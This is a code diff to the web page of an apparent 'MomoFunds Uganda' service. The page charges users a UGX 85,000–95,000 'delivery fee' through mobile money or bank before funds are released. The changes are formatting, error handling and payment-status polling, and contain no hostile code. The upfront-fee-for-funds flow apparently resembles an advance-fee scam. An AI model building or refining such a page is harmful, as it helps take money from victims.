@@ -293,7 +293,6 @@ font-size:12px;
 <body>
 
 <div class="container">
-
 <div class="card">
 
 <div class="progress">
@@ -315,9 +314,9 @@ Choose your preferred delivery method and continue with your MomoFunds Uganda de
 <label class="delivery-option">
 <input type="radio" name="delivery" value="85000">
 <div>
-<div class="method"><span class="method-icon">📱</span>Mobile Money</div>
+<div class="method"><span class="method-icon">📱</span> Mobile Money</div>
 <div class="fee">
-<span class="delivery-amount">UGX 85000</span> delivery fee
+<span class="delivery-amount">UGX 85,000</span> delivery fee
 <br><small>Estimated delivery: 1–5 minutes</small>
 </div>
 </div>
@@ -327,9 +326,9 @@ Choose your preferred delivery method and continue with your MomoFunds Uganda de
 <label class="delivery-option">
 <input type="radio" name="delivery" value="95000">
 <div>
-<div class="method"><span class="method-icon">🏦</span>Bank Account</div>
+<div class="method"><span class="method-icon">🏦</span> Bank Account</div>
 <div class="fee">
-<span class="delivery-amount">UGX 95000</span> delivery fee
+<span class="delivery-amount">UGX 95,000</span> delivery fee
 <br><small>Estimated delivery: 1–5 minutes</small>
 </div>
 </div>
@@ -393,7 +392,14 @@ spinner.style.display=loading?"block":"none";
 
 async function readJson(response){
 const text=await response.text();
-return text?JSON.parse(text):{};
+
+if(!text) return {};
+
+try{
+return JSON.parse(text);
+}catch{
+throw new Error("Server returned an invalid response.");
+}
 }
 
 async function payDelivery(){
@@ -414,7 +420,11 @@ return;
 
 const amount=Number(selected.value);
 
-localStorage.setItem("deliveryMethod",amount===500?"Mobile Money":"Bank Account");
+localStorage.setItem(
+"deliveryMethod",
+amount===85000 ? "Mobile Money" : "Bank Account"
+);
+
 localStorage.setItem("deliveryFee",amount);
 
 setLoading(true,"Sending...");
@@ -444,8 +454,12 @@ data.transaction_id||
 data.reference||
 data.data?.reference;
 
+if(!transactionId){
+throw new Error("No transaction ID returned.");
+}
+
 setLoading(true,"Waiting...");
-setStatus("Please complete the payment on your phone.");
+setStatus("Payment request sent. Waiting for confirmation...");
 
 await checkPayment(transactionId);
 
@@ -467,7 +481,12 @@ const response=await fetch(`${BACKEND_URL}/api/uganda/status/${transactionId}`);
 
 const result=await readJson(response);
 
-const status=String(result.data?.status||"").toUpperCase();
+const payment=result.data||result;
+const status=String(payment.status||"").toUpperCase();
+
+if(status==="PENDING"){
+setStatus("Payment request sent. Waiting for confirmation...");
+}
 
 if(["SUCCESS","SUCCESSFUL"].includes(status)){
 setStatus("Payment confirmed. Redirecting...","success");
